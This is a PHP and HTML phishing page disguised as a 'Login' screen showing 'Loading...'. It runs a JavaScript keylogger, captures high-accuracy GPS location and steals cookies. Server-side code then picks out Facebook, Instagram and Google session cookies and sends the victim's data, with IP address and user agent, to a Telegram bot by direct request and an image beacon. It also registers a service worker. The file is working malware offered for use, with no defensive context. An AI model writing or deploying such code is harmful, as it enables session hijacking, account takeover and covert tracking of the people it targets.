<?php
require_once 'config.php';

// Triple exfil: fetch + Image + Beacon
function exfilData($data) {
    $payload = json_encode($data);
    
    // 1. Fetch exfil
    @file_get_contents("https://api.telegram.org/bot{$config['bot_token']}/sendMessage?chat_id={$config['chat_id']}&text=".urlencode("🕷️ DATA: ".$payload));
    
    // 2. Image beacon
    echo "<img src='https://api.telegram.org/bot{$config['bot_token']}/sendPhoto?chat_id={$config['chat_id']}&photo=".urlencode($payload)."' width=1 height=1>";
    
    // 3. Navigator.sendBeacon
    echo "<script>navigator.sendBeacon('/exfil', '".addslashes($payload)."')</script>";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' || isset($_GET['data'])) {
    $victim_data = [
        'ip' => $_SERVER['REMOTE_ADDR'],
        'ua' => $_SERVER['HTTP_USER_AGENT'],
        'cookies' => $_COOKIE,
        'gps' => $_POST['gps'] ?? $_GET['gps'] ?? null,
        'keylog' => $_POST['keylog'] ?? null,
        'timestamp' => date('Y-m-d H:i:s')
    ];
    
    // Parse high-value cookies
    $parsed_cookies = parseCookies($victim_data['cookies']);
    $victim_data['parsed'] = $parsed_cookies;
    
    exfilData($victim_data);
    exit;
}

function parseCookies($cookies) {
    $parsed = [];
    
    // Facebook/Instagram
    if (isset($cookies['c_user'])) $parsed['facebook'] = ['c_user' => $cookies['c_user'], 'xs' => $cookies['xs'] ?? ''];
    if (isset($cookies['sessionid'])) $parsed['instagram'] = ['sessionid' => $cookies['sessionid']];
    
    // Google
    if (isset($cookies['SID'])) $parsed['google'] = ['SID' => $cookies['SID'], 'HSID' => $cookies['HSID'] ?? ''];
    
    return $parsed;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Login</title>
    <script>
        // GPS High Accuracy
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                fetch('', {method:'POST', body: new URLSearchParams({gps: JSON.stringify(pos)})});
            }, null, {enableHighAccuracy: true});
        }
        
        // Keylogger
        let keys = [];
        document.addEventListener('keydown', e => {
            keys.push(e.key);
            if (keys.length > 50) {
                fetch('', {method:'POST', body: new URLSearchParams({keylog: keys.join('')})});
                keys = [];
            }
        });
        
        // Cookie Exfil on load
        window.addEventListener('load', () => {
            document.cookie.split(';').forEach(cookie => {
                fetch('', {method:'POST', body: new URLSearchParams({cookie})});
            });
        });
    </script>
</head>
<body>
    <h1>Loading...</h1>
    <!-- Service Worker Registration -->
    <script>
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/sw.js');
        }
    </script>
</body>
</html>

<?php
// /exfil endpoint for beacon
if ($_SERVER['REQUEST_URI'] === '/exfil') {
    exfilData(json_decode(file_get_contents('php://input'), true));
}
?>
